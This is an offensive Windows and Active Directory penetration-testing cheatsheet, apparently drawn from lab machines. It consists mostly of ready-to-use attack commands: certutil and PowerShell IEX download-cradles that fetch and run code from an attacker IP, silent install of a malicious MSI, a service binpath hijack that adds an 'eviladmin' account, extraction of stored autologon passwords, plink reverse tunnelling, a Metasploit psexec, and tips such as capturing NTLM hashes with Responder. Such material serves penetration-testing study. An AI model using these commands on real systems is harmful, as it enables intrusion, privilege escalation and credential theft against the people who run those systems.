# Cheatsheet

## Recon

* IP, subnet, default gateway etc: `ipconfig /all`

* Current user name, info in current access token, SID, privs and group that current user belongs to: `whoami /all`
* Local groups on current machine: `net localgroup`
* Local administrators of current machine: `net localgroup "administrators"`
* Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: `netstat -an`
* Running processes with verbose mode: `tasklist /V`
* Startup programs: `net start`
* Windows services with binary paths: `sc qc <service>`
* OS, processor, memory, bios related info: `systeminfo>output.txt`
* Scheduled jobs: `schtasks /query /fo LIST /v`
* Patches installed and figuring out if its missing important any patch: `wmic qfe get Caption,Description,HotFixID,InstalledOn` 

## Domain Network Recon

* Mapping of IP address to its MAC address in the network: `arp -a`
* Domain: `echo %USERDOMAIN%`
* Domain controller name: `echo %logonserver%`
* List of domain users: `net user /domain` 
* List of groups in the domain: `net group /domain`
* AD domain password policy: `net accounts /domain`
* Map AD trust relationships: `nltest /domain_trusts`

## Moving files

> - Ref: http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html

```
certutil -verifyctl -split -f ​ http://10.10.14.8/taskkill.exe
mv *.bin taskkill.exe
```

## Extract ZIP
```
Add-Type -assembly
'system.io.compression.filesystem';[io.compression.zipfile]::ExtractToDirectory
("C:\backup.zip","C:\Example\")
```

## View File Systems
```
gdr -PSProvider 'FileSystem'
```

## Access shared volume
```
net use y: \\10.10.10.57\c$ /user:administrator 1234test
```

## Invoke command with credentials
```
$user = '.\administrator';
$psw = '1234test';
$secpsw = ConvertTo-SecureString $psw -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $user, $secpsw
```
```
invoke-command -computername localhost -credential $credential
-scriptblock {cd C:\Users\Administrator\Desktop\;C:\Users\Administrator\Desktop\root.exe}
```
## Alternate Data Stream
- Listing: `dir /R`
- Find Streams: `​get-item -path *.* -stream *`
- Reading: `​powershell Get-Content -Path "hm.txt" -Stream "root.txt"`
- Reading: `get-content backup.zip -stream 'pass'`
- Reading: `streams.exe /accepteula -s` from sysinternals

## MSI

### Installing MSI
```
msiexec /quiet /qn /i malicious.msi
```
```
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

## Services

- Registry entries: `HKLM\SYSTEM\CurrentControlSet\Services`
- View service properties: `sc qc "Vulnerable Service"`
- Restarting: `sc stop "Vulnerable Service"`
- Service information: `Get-Service​ ​ "Ubiquiti UniFi Video"​ | fl *`
- Restart PC: `shutdown /r /t 0`
- Change binary path: `sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add`

### Keep alive
When a service starts in Windows operating systems, it must communicate with the `Service Control Manager`. If it’s not, `Service Control Manager` will terminates the process.

## Auto Save Password to PowerShell
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```
```
$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)​

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential $creds
```
## Permissions

```
whoami /priv
```

## View Permisions
```
cacls C:\Users\Administrator\Desktop\root.txt
```

### Grant Permissions
```
cacls C:\Users\Administrator\Desktop\root.txt /grant Alfred:F
```

## SSH from Windows to Attacker (Kali)

### Manual
From Windows:
```
plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8
```

From Attacker:
```
netstat -ano | grep 445
winexe -U Administrator //127.0.0.1 "cmd.exe"
```

### Metasploit
```
portfwd add -l 445 -p 445 -r 127.0.0.1
use exploit/windows/smb/psexec
 set SMBDOMAIN CHATTERBOX
 set SMBUSER Administrators
 set SMBPASS Welcome1!
 set RHOST 127.0.0.1
exploit
```



## Enumeration Tips 

> Ref: [https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/](https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/)

- Check the policies related to Network Access Control. Whether it can be bypassed or not.
- Go for guest wifi. It could lead you to get inside the company network if it is not segregated.
- Check for the printers in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords.
- Check for misconfigurations in the systems as well as the network.
- At the Domain level, always look for “Administrators” group members instead of going just for “Domain Admins”. Reason being Builtin Administrators group is the superior one. Even “Domain Admins” group is also the member of administrators groups.
- Look for User Rights Assignments in the GPOs. They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights.
- Most of the organizations use the same image for all of their deployments. Which means they use same local admin password. Always check if same local admin account is being used in whole domain.
- Identify Admin Restrictions. (Logon Hours, LogonWorkstations) Decoys can be detected using this.
- Use Responder to collect NTLM hashes.
- Check [SYSVOL](https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx) too.
- ShareEnum to look for file shares. 
- 